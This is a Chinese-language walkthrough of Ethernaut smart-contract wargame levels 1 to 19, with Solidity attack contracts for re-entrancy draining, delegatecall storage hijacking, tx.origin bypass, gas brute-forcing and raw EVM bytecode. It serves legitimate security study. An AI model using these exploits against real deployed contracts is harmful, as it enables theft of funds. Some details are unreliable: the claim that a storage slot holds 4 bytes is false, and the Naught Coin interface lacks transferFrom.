# Writeup(31)
## 1.Hello Ethernaut

跟着返回的提示调用合约函数

![](../images/a-ethnaut-1-1.png)

## 2.Fallback
1. 调用contribute函数捐款小于0.001e的数额, getContribution函数返回值大于0
2. 发送任意数额的eth调用fallback函数, owner改为当前账户
3. 调用withdraw提取所有金额

## 3.Fallout

Fal1out并不是构造函数, 手动调用即可

注意:Solidity合约构造函数不能和合约名一样

## 4.Coin Flip
编写合约代码, 提前计算结果, 在不同的区块下调用guess函数10次
```solidity
contract Guess {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip x = CoinFlip(0x7B588F9C807501337AFa5AeF3945bd18FdAF9CbF);
    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        x.flip(side);
    }
}
```
## 5.Telephone
tx.origin是交易的发起者, msg.sender是当前函数的调用者
编写hack合约, 通过合约调用changeOwner函数
```solidity
contract Hack {
    constructor() {
        Telephone t = Telephone(0x35B2bAb61Ee13B9256811B693AA054Ad1dd016Ec);
        t.changeOwner(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
    }
}
```
## 6. Token
向任意地址发送21单位的token
```solidity
// 直接操作uint256变量减法会有溢出问题
require(balances[msg.sender] - _value >= 0);
```
## 7.Delegation
利用下面的代码完成代理调用
```solidity
(bool result,) = address(delegate).delegatecall(msg.data);
```
向Delegation合约发送0eth, tx的data部分为pwn的方法id

## 8. Force
使用selfdestruct销毁自建合约, 向目标合约发送eth
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    constructor() payable public {
        selfdestruct(0x888Eaa51Cd5E643DFc19b594DA803362c5265B7b);
    }
}
```
## 9. Vault
使用函数w3.eth.get_storage_at读取对应slot值, 获取password, 调用unlock函数解锁

## 10. King
使用合约向目标合约转0.001eth, 成为新的king, 其他人再尝试获得king会因为transfer不成功而失败
注意要使用低级调用call函数, 当调用数据为空时, 会自动调用目标合约的receive函数
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    constructor() payable public {
        (bool success, ) = 0xaD5Ae7Ec24Ae99e2971F5f0D5c21DCBe24189962.call{value:msg.value}("");
        require(success, "failed");
    }
}
```
## 11. Re-entrancy
目标合约的withdraw函数先转账再扣除余额, 引发重入攻击
攻击合约实现receive函数, 当目标合约的余额大于0时, 可以继续递归调用withdraw函数提取资金
```solidity
// 部署合约附带0.001e
contract Hack {
    Reentrance r = Reentrance(0xFAe73a7Df5253a2a8b7e32987866c2B157861371);

    constructor() payable public {
        r.donate{value: msg.value}(address(this));
    }

    function hack() public {
        r.withdraw(r.balanceOf(address(this)));
        selfdestruct(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
    }

    receive() external payable { 
        if (address(r).balance > 0) {
            r.withdraw(r.balanceOf(address(this)));
        }
     }
}
```
## 12. Elevator
编写攻击合约, 实现isLastFloor方法, 判断Elevator合约的floor是否为目标楼层, 根据情况返回结果
```solidity
contract Hack {
    Elevator e = Elevator(0x5C77b7D11a6CeDc83D0f41D096C3E6874dF7CeF9);
    
    function hack() public  {
        e.goTo(10);
    }

    function isLastFloor(uint256 floor) external view returns (bool) {
        uint256 i = e.floor();
        if (i == floor) return true;
        else return false;
    }

}
```
## 13. Privacy
solidity合约的每个slot存4个bytes
变量值排布如下
```
0: |X    X    X    bool|
1: |      uint256      |
2: |uint8 uint8 uint16 |
3: |      bytes32      |
4: |      bytes32      |
5: |      bytes32      |
```
因此所需数据data[2]在slot5中
再对数据截断, 转换为bytes16
参考文档: https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html#

## 14. Gatekeeper One

使用合约间接调用绕过gateOne函数限制,
gateThree所需的参数gateKey计算方法:

```solidity
bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
```

执行到gateTwo需要消耗部分gas, 剩余gas不确定, 可以通过循环暴力尝试

```solidity
contract Hack {
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    function attack() public {
        for (uint256 i = 0; i < 3000; i++) {
            (bool success,) = address(0x369bfaf01354101F4c6B4b37A257b355894B03a8).call{gas: i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
```

## 15. Gatekeeper Two

通过中间合约绕过gateOne,
在合约构造函数中调用目标函数, 被调用合约中获得的代码段size为0, 从而绕过gateTwo
利用异或计算规则:A ^ B = C 则 A ^ C = B, gateThree的Key计算如下

```solidity
bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
```

最终合约

```solidity
contract Hack {
    constructor() public {
        GatekeeperTwo g = GatekeeperTwo(0x834b721Ba3299155f5Cb89906662427A6A8Ab0C2);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        g.enter(key);
    }
}
```

## 16. Naught Coin

目标合约仅限制msg.sender为玩家, 可以通过合约调用绕过限制
先approve授权token到攻击合约, 再使用攻击合约调用transferFrom转账

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Coin {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address t) external view returns (uint256);
}

contract Hack {
    function attack() public {
        Coin c = Coin(0x0eBff6279fa409d47004d66baDD14ea137f04De1);
        c.transferFrom(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f), address(1), c.balanceOf(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f));
    }
}
```

## 17. Preservation

delegatecall调用合约时, 会使用被调合约的代码, 修改当前调用合约对应slot的值,
利用该特性, 先调用setFirstTime函数修改slot0也就是timeZone1Library的值为攻击合约地址,
再调用setFirstTime利用攻击合约的代码修改slot2也就是owner的值

```solidity
contract Hack {
    uint256 public s1;
    uint256 public s2;
    address public s3;

    function setTime(uint256 _timeStamp) public {
        s3 = 0x3E9436324544C3735Fd1aBd932a9238d8Da6922f; // player地址
    }
}
```

## 18. Recovery

通过区块浏览器查询到创建的SimpleToken合约地址为0xC1a1118fAAB0Ae16A4Ad026D0c30d139B7e0d550
然后调用该合约的destroy函数获取所有eth

## 19. MagicNumber

智能合约包含2部分

- 初始化代码(构造函数逻辑)
    - evm创建合约时运行
- 运行时代码(其他逻辑)
    - 实际的执行逻辑, 题目限制10bytes, 需要返回bytes32的数字42

```
合约初始化代码
600a
600c
6000
39    ---- CODECOPY(0x00, 0x0c, 0x0a)  复制0c位置开始, 长度10个bytes的代码
600a
6000
f3    ---- RETURN(0x00, 0x0a)  返回0x00位置开始, 长度0x0a的数据
---
合约运行时代码
602a  
6080
52    ---- MSTORE(0x80, 0x2a) 将0x2a(42)存到0x80位置
6020
6080
f3    ---- RETURN(0x80, 0x20) 返回0x80位置, 长度0x20的值

最终合约代码: 600a600c600039600a6000f3602a60805260206080f3
```

参考: https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2
